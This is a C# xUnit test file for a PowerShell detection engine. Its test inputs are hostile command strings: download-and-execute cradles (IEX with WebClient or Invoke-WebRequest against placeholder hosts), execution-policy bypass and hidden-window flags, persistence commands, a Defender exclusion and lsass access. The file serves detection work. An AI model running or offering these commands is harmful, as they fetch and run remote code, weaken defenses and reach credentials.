using Detector.PowerShell;
using Xunit;

public class PsHeuristicsTests
{
    [Fact]
    public void Flags_Download_Cradle()
    {
        var hits = PsHeuristics.Evaluate("IEX (New-Object Net.WebClient).DownloadString('http://x')");
        Assert.Contains(hits, h => h.Rule.Contains("iex"));
        Assert.Contains(hits, h => h.Rule.Contains("webclient"));
    }

    [Fact]
    public void Flags_Injection_Api_As_Critical()
    {
        var hits = PsHeuristics.Evaluate("[Kernel32]::VirtualAlloc(0,0x1000,0x3000,0x40)");
        Assert.Contains(hits, h => h.Rule == "ps.injection-api" && h.Severity == Detector.Model.Severity.Critical);
    }

    [Fact]
    public void Clean_Script_Has_No_Hits()
    {
        Assert.Empty(PsHeuristics.Evaluate("Get-ChildItem | Sort-Object Name"));
    }

    [Theory]
    [InlineData("-exec bypass")]
    [InlineData("-executionpolicy bypass")]
    [InlineData("-ep bypass")]
    public void Flags_ExecutionPolicy_Bypass_Abbreviations(string arg)
    {
        Assert.Contains(PsHeuristics.Evaluate($"powershell {arg}"), h => h.Rule == "ps.exec-bypass");
    }

    [Theory]
    [InlineData("-w hidden")]
    [InlineData("-window hidden")]
    [InlineData("-windowstyle hidden")]
    public void Flags_WindowStyle_Hidden_Abbreviations(string arg)
    {
        Assert.Contains(PsHeuristics.Evaluate($"powershell {arg}"), h => h.Rule == "ps.window-hidden");
    }

    [Fact]
    public void Does_Not_Falsely_Flag_Bare_Dash_E_As_ExecBypass()
    {
        // "-e bypass" is not -ExecutionPolicy; it must not trip ps.exec-bypass.
        Assert.DoesNotContain(PsHeuristics.Evaluate("powershell -e bypass"), h => h.Rule == "ps.exec-bypass");
    }

    [Theory]
    [InlineData("Register-ScheduledTask -TaskName Demo", "ps.persistence-task")]
    [InlineData("New-Service -Name Demo -BinaryPathName C:\\Demo.exe", "ps.persistence-service")]
    [InlineData("Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Demo", "ps.persistence-autorun")]
    [InlineData("Add-MpPreference -ExclusionPath C:\\Temp", "ps.security-exclusion")]
    [InlineData("Get-Process lsass", "ps.credential-access")]
    public void Flags_AdditionalDefenderRelevantBehavior(string script, string rule)
    {
        Assert.Contains(PsHeuristics.Evaluate(script), hit => hit.Rule == rule);
    }

    [Fact]
    public void Flags_DownloadAndExecuteCombination()
    {
        var hits = PsHeuristics.Evaluate("IEX (Invoke-WebRequest https://example.invalid/a).Content");

        Assert.Contains(hits, hit => hit.Rule == "ps.download-execute");
    }
}
